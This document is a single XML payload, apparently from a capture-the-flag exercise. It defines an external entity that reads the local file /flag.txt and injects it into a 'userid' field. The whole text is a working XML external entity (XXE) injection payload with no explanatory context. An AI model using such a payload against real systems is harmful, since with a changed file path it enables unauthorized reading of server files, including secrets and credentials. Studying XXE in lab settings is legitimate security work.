```
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE userid [ <!ENTITY xxetest SYSTEM "file:///flag.txt"> ]> <root> <subtotal> undefined </subtotal> <userid> &xxetest; </userid> </root>
```